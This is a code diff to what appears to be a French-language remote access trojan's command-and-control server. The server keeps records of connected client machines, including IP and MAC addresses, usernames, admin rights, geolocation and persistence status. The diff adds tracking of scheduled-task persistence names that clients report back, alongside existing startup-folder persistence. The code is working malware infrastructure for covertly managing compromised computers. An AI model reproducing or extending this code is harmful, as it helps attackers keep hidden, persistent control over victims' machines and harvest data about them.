@@ -107,7 +107,7 @@ class Threads:
         print("Arret du Thread : " + self.thread_name + ", numéro : " + str(self.thread_id))
         _async_raise(self.thread_id, SystemExit)
 
-def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4, persistance):
+def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4, persistance, name_task):
     client = {
     "client_num": client_num,
     "platform": platform,
@@ -120,7 +120,8 @@ def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, archi
     "administrator": administrator,
     "geolocation": geolocation,
     "ipv4": ipv4,
-    "persistance": persistance
+    "persistance": persistance,
+    "name_task": name_task
     }
 
     i = 1
@@ -159,7 +160,7 @@ def DefinirIdConn(macAdress):
 def ReturnInfo(macAdress, info_name):
     fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
     data = json.load(fichier)
-    print(data[info_name])
+    #print(data[info_name])
     info = data[info_name]
     fichier.close
     return info
@@ -179,6 +180,7 @@ def DefinirPersistance(macAdress, value):
     geolocation = data["geolocation"]
     ipv4 = data["ipv4"]
     persistance = value
+    name_task = data["name_task"]
     client = {
     "client_num": client_num,
     "platform": platform,
@@ -191,7 +193,45 @@ def DefinirPersistance(macAdress, value):
     "administrator": administrator,
     "geolocation": geolocation,
     "ipv4": ipv4,
-    "persistance": persistance
+    "persistance": persistance,
+    "name_task": name_task
+    }
+    fichier.close()
+    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "w")
+    fichier.write(json.dumps(client, indent=4))
+    fichier.close()
+    return True
+
+def DefinirNameTask(macAdress, value):
+    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
+    data = json.load(fichier)
+    client_num = data["client_num"]
+    platform = data["platform"]
+    public_ip = data["public_ip"]
+    local_ip = data["local_ip"]
+    mac_address = data["mac_address"]
+    architecture = data["architecture"]
+    device = data["device"]
+    username = data["username"]
+    administrator = data["administrator"]
+    geolocation = data["geolocation"]
+    ipv4 = data["ipv4"]
+    persistance = data["persistance"]
+    name_task = value
+    client = {
+    "client_num": client_num,
+    "platform": platform,
+    "public_ip": public_ip,
+    "local_ip": local_ip,
+    "mac_address": mac_address,
+    "architecture": architecture,
+    "device": device,
+    "username": username,
+    "administrator": administrator,
+    "geolocation": geolocation,
+    "ipv4": ipv4,
+    "persistance": persistance,
+    "name_task": name_task
     }
     fichier.close()
     fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "w")
@@ -242,14 +282,15 @@ def AfficherClients(path):
                 geolocation = data["geolocation"]
                 ipv4 = data["ipv4"]
                 persistance = data["persistance"]
+                name_task = data["name_task"]
                 file.close()
                 print("\n\t\tListe clients :")
                 print("\nNumero Client : %s\n\tPlatform : %s\
                 \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
                 \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s\
-                \n\tIpv4 : %s\n\tPersistance : %s" \
+                \n\tIpv4 : %s\n\tPersistance : %s\n\tname_task : %s" \
                 % (client_num, platform,public_ip, local_ip,mac_address, architecture,\
-                device, username, administrator, geolocation, ipv4, persistance))
+                device, username, administrator, geolocation, ipv4, persistance, name_task))
 
 class Server:
 
@@ -283,7 +324,7 @@ class Server:
             print('Connected to: ' + address[0] + ':' + str(address[1]) + "\n")
             self.ThreadCount += 1
             self.LaunchThread("Client", Client, address ,self.ThreadCount)
-            print('Thread Number: ' + str(self.ThreadCount))
+            #print('Thread Number: ' + str(self.ThreadCount))
             #print(Client.connect())
         ServerSocket.close()
         
@@ -303,11 +344,18 @@ class Server:
         if TestMacAddress(pathDb, extDb, mac_address)[0] == False:
             print("Nouveau Client !")
             InscrireClient(id_conn, platform, public_ip, local_ip, mac_address, architecture,\
-             device, username, administrator, geolocation, ipv4, "OFF")
+             device, username, administrator, geolocation, ipv4, "OFF", None)
+            ## envoi RAS
+            message = "RAS"
+            connection.sendall(str.encode(message))
         else:
-            print("Client existe deja, num par defaut : " + str(id_conn))
+            #print("Client existe deja, num par defaut : " + str(id_conn))
             id_conn = DefinirIdConn(mac_address)
-            print("Nouveau id : " + str(id_conn))
+            #print("Nouveau id : " + str(id_conn))
+            ## envoi le nom de la tache si elle existe
+            message = ReturnInfo(mac_address, "name_task")
+            connection.sendall(str.encode(message))
+
         exit = False
         while True:
         #print(str(connection.__getstate__))
@@ -367,7 +415,13 @@ class Server:
                                 if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
                                     print("Persistance deja activer mise a jour du fichier client")
                                     DefinirPersistance(mac_address, "ON")
-                                print(results)
+                                if "Persistance tache planifié activé" in results:
+                                    print("Persistance tache planifié activé")
+                                    DefinirPersistance(mac_address, "ON")
+                                    name_task = results.replace("Persistance tache planifié activé", "")
+                                    DefinirNameTask(mac_address, name_task)
+                                if not "Persistance tache planifié activé" in results:
+                                    print(results)
                             #else:
                                 ##print("egale a rien")
             if exit:
